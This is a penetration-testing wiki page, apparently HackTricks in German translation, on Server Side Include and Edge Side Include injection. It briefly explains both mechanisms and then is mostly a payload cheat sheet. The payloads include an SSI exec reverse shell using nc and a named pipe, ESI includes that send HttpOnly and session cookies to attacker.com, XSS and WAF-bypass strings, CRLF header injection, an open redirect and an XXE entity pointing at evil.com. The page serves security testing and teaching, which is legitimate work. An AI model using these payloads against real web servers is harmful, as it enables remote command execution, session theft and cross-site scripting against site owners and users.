# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Grundinformationen

**(Einf√ºhrung aus [Apache-Dokumentation](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) sind Direktiven, die **in HTML-Seiten platziert und auf dem Server ausgewertet** werden, w√§hrend die Seiten bereitgestellt werden. Sie erm√∂glichen es Ihnen, **dynamisch generierte Inhalte** zu einer bestehenden HTML-Seite hinzuzuf√ºgen, ohne die gesamte Seite √ºber ein CGI-Programm oder eine andere dynamische Technologie bereitstellen zu m√ºssen.\
Zum Beispiel k√∂nnten Sie eine Direktive in eine bestehende HTML-Seite einf√ºgen, wie:

`<!--#echo var="DATE_LOCAL" -->`

Und wenn die Seite bereitgestellt wird, wird dieses Fragment ausgewertet und durch seinen Wert ersetzt:

`Dienstag, 15-Jan-2013 19:28:54 EST`

Die Entscheidung, wann SSI verwendet werden soll und wann die gesamte Seite von einem Programm generiert werden soll, h√§ngt normalerweise davon ab, wie viel der Seite statisch ist und wie viel jedes Mal neu berechnet werden muss, wenn die Seite bereitgestellt wird. SSI ist eine gro√üartige M√∂glichkeit, kleine Informationsst√ºcke hinzuzuf√ºgen, wie die aktuelle Zeit - oben gezeigt. Aber wenn der Gro√üteil Ihrer Seite zum Zeitpunkt der Bereitstellung generiert wird, m√ºssen Sie nach einer anderen L√∂sung suchen.

Sie k√∂nnen das Vorhandensein von SSI ableiten, wenn die Webanwendung Dateien mit den Erweiterungen **`.shtml`, `.shtm` oder `.stm`** verwendet, aber das ist nicht der einzige Fall.

Ein typischer SSI-Ausdruck hat das folgende Format:
```
<!--#directive param="value" -->
```
### √úberpr√ºfen
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Es gibt ein Problem mit **Caching-Informationen oder dynamischen Anwendungen**, da der Inhalt m√∂glicherweise beim n√§chsten Abrufen des Inhalts **variieren** kann. Daf√ºr wird **ESI** verwendet, um mit ESI-Tags den **dynamischen Inhalt anzugeben, der generiert werden muss**, bevor die Cache-Version gesendet wird.\
Wenn ein **Angreifer** in der Lage ist, **ein ESI-Tag** in den Cache-Inhalt einzuf√ºgen, k√∂nnte er in der Lage sein, **willk√ºrlichen Inhalt** in das Dokument einzuf√ºgen, bevor es an die Benutzer gesendet wird.

### ESI Detection

Die folgende **Header** in einer Antwort vom Server bedeutet, dass der Server ESI verwendet:
```
Surrogate-Control: content="ESI/1.0"
```
Wenn Sie diesen Header nicht finden k√∂nnen, **k√∂nnte der Server trotzdem ESI verwenden**.\
Ein **blinder Exploitationsansatz kann ebenfalls verwendet werden**, da eine Anfrage beim Server des Angreifers ankommen sollte:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI-Ausnutzung

[GoSecure erstellt](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) eine Tabelle, um m√∂gliche Angriffe zu verstehen, die wir gegen verschiedene ESI-f√§hige Software ausprobieren k√∂nnen, abh√§ngig von der unterst√ºtzten Funktionalit√§t:

* **Includes**: Unterst√ºtzt die `<esi:includes>`-Direktive
* **Vars**: Unterst√ºtzt die `<esi:vars>`-Direktive. N√ºtzlich zum Umgehen von XSS-Filtern
* **Cookie**: Dokumentencookies sind f√ºr die ESI-Engine zug√§nglich
* **Upstream-Header erforderlich**: Surrogatanwendungen verarbeiten ESI-Anweisungen nicht, es sei denn, die upstream-Anwendung stellt die Header bereit
* **Host-Whitelist**: In diesem Fall sind ESI-Includes nur von erlaubten Serverhosts m√∂glich, was SSRF beispielsweise nur gegen diese Hosts m√∂glich macht

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream-Header erforderlich** | **Host-Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :-----------------------------: | :----------------: |
|            Squid3            |      Ja     |    Ja   |     Ja     |              Ja                |         Nein       |
|         Varnish Cache        |      Ja     |    Nein  |      Nein   |              Ja                |         Ja         |
|            Fastly            |      Ja     |    Nein  |      Nein   |              Nein               |         Ja         |
| Akamai ESI Testserver (ETS)  |      Ja     |    Ja   |     Ja     |              Nein               |         Nein       |
|          NodeJS esi          |      Ja     |    Ja   |     Ja     |              Nein               |         Nein       |
|         NodeJS nodesi        |      Ja     |    Nein  |      Nein   |              Nein               |      Optional      |

#### XSS

Die folgende ESI-Direktive l√§dt eine beliebige Datei in die Antwort des Servers
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Umgehung des Client-XSS-Schutzes
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Steal Cookie

* Fernzugriff auf Cookies stehlen
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Stehlen Sie das Cookie HTTP\_ONLY mit XSS, indem Sie es in der Antwort reflektieren:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Private Local File

Verwechseln Sie dies nicht mit einer "Local File Inclusion":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Das Folgende wird einen `Location`-Header zur Antwort hinzuf√ºgen
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Header hinzuf√ºgen

* Header in erzwungenem Request hinzuf√ºgen
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* F√ºgen Sie einen Header in die Antwort ein (n√ºtzlich, um "Content-Type: text/json" in einer Antwort mit XSS zu umgehen)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF im Add-Header (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai-Debug

Dies sendet Debug-Informationen, die in der Antwort enthalten sind:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Durch die Angabe des Wertes `xslt` f√ºr den _dca_-Parameter ist es m√∂glich, **`eXtensible Stylesheet Language Transformations (XSLT)`** basierte ESI einzuschlie√üen. Die Einbeziehung bewirkt, dass der HTTP-Surrogate die XML- und XSLT-Dateien abruft, wobei letztere erstere filtert. Solche XML-Dateien sind f√ºr _XML External Entity (XXE)_ Angriffe ausnutzbar, die es Angreifern erm√∂glichen, SSRF-Angriffe auszuf√ºhren. Die N√ºtzlichkeit dieses Ansatzes ist jedoch begrenzt, da ESI bereits als SSRF-Vektor dient. Aufgrund der fehlenden Unterst√ºtzung in der zugrunde liegenden Xalan-Bibliothek werden externe DTDs nicht verarbeitet, was die Extraktion lokaler Dateien verhindert.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT-Datei:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT-Seite:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referenzen

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force-Erkennungsliste

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
